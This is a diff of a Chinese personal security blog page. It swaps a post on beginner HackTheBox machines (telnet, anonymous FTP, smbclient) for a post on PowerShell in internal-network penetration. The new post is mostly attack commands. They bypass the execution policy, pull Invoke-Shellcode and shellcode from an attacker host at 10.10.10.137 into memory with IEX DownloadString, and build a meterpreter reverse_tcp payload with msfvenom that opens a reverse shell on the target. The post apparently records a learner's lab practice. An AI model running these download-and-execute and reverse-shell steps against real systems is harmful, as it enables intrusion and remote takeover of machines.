@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    hackthebox第一次打靶记录 |  K0uSAOF
+    powershell在内网渗透中的使用 |  K0uSAOF
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-hackthebox第一次打靶记录"
+  id="post-powershell在内网渗透中的使用"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -55,22 +55,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  hackthebox第一次打靶记录
+  powershell在内网渗透中的使用
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2023-03-23T16:00:00.000Z" itemprop="datePublished">2023-03-24</time>
+      <a href="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time datetime="2023-03-31T16:00:00.000Z" itemprop="datePublished">2023-04-01</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">360</span>
+            <span class="post-count">248</span>
         </span>
     </span>
 
@@ -94,25 +94,30 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近先暂时放下了代码审计的课程内容，我发现这部分的内容还真不是太好学，首先是课程里的cms搭建(由于资源比较难找)，其次是逻辑还没有搞清楚（可能是老师讲课的问题），所以我选择接下来学习权限提升这部分的内容。有时候真觉得课程里的操作太少了，所以我开始打hackthebox上的靶机来锻炼一下渗透的思维。</p>
-<p>我先从基础的靶机开始，所以会比较简单。</p>
-<h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><p>这个靶机主要是考察telnet/23和nmap对目标的识别，最后通过telnet连接上目标尝试root，admin，administrator空口令登录，root用户登录成功，获取到flag.txt</p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324085703835.png" alt="image-20230324085703835"></p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324085748679.png" alt="image-20230324085748679"></p>
-<h2 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h2><p>第二个靶场考察的是FTP(file transfer protocal)/21和os的识别，思路是通过<code>anonymous </code>用户匿名登录上ftp服务获取flag.txt，其中下载文件使用命令<code>get</code>,列出文件列表使用<code>dir</code> <code>ls</code></p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324091835447.png" alt="image-20230324091835447"></p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324092024301.png" alt="image-20230324092024301"></p>
-<p>打开下载到本地的flag.txt</p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324092133486.png" alt="image-20230324092133486"></p>
-<h2 id="dancing"><a href="#dancing" class="headerlink" title="dancing"></a>dancing</h2><p>这个靶机主要考smb(Server Message Block )/445，其中涉及到smbclient工具的使用。</p>
-<p>首先查看共享的目录列表</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324093756511.png" alt="image-20230324093756511"></p>
-<p>然后带$符号的是不能直接访问的，而WorkShares是直接可以访问的文件目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\xxx.xxx.xxx.xxx\\WorkShares</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324094350253.png" alt="image-20230324094350253"></p>
-<p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324094445955.png" alt="image-20230324094445955"></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上就是我在hackthebox的Shatring Point部分打的三个靶机的记录。</p>
+  <h2 id="绕过本地权限执行ps文件"><a href="#绕过本地权限执行ps文件" class="headerlink" title="绕过本地权限执行ps文件"></a>绕过本地权限执行ps文件</h2><p>使用到的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\test.ps1 </span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230330201841186.png" alt="image-20230330201841186"></p>
+<p>成功绕过Restricted权限执行test.ps1</p>
+<h2 id="Invoke-shellcode反弹shell"><a href="#Invoke-shellcode反弹shell" class="headerlink" title="Invoke-shellcode反弹shell"></a>Invoke-shellcode反弹shell</h2><p>Invoke-Shellcode.ps1地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.137&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1</span><br></pre></td></tr></table></figure>
+<p>shellcode地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.137&#x2F;code</span><br></pre></td></tr></table></figure>
+<p>1.目标主机加载Invoke-Shellcode.ps1至内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.10.10.137&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;);</span><br></pre></td></tr></table></figure>
+<p>2.目标主机加载shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object    Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.10.10.137&#x2F;code&quot;)</span><br></pre></td></tr></table></figure>
+<p>3.反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode ($buf) -Force</span><br></pre></td></tr></table></figure>
+<p>4.出现的问题</p>
+<p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230401105950030.png" alt="image-20230401105950030"></p>
+<h2 id="powershell后门反弹shell"><a href="#powershell后门反弹shell" class="headerlink" title="powershell后门反弹shell"></a>powershell后门反弹shell</h2><p>1.生成后门payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.137 LPORT=5555 -f psh-reflection &gt;x.ps1</span><br></pre></td></tr></table></figure>
+<p>2.将生成的payload放到web服务器上</p>
+<p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230401213747815.png" alt="image-20230401213747815"></p>
+<p>3.攻击机设置监听，并在目标主机通过IEX命令加载ps1文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.10.137&#x2F;x.ps1&#39;)</span><br></pre></td></tr></table></figure>
+<p>出现的问题</p>
+<p>反弹到msf的会话不稳定，powershell会终止运行</p>
  
       <!-- reward -->
       
@@ -184,7 +189,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -195,19 +200,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-nav-link">
+      <a href="/2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            powershell在内网渗透中的使用
+            CVE-2020-0787_本地权限提升
           
         </div>
       </a>
     
     
-      <a href="/2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+      <a href="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">探究java反序列化漏洞</div>
+        <div class="article-nav-title">hackthebox第一次打靶记录</div>
       </a>
     
   </nav>
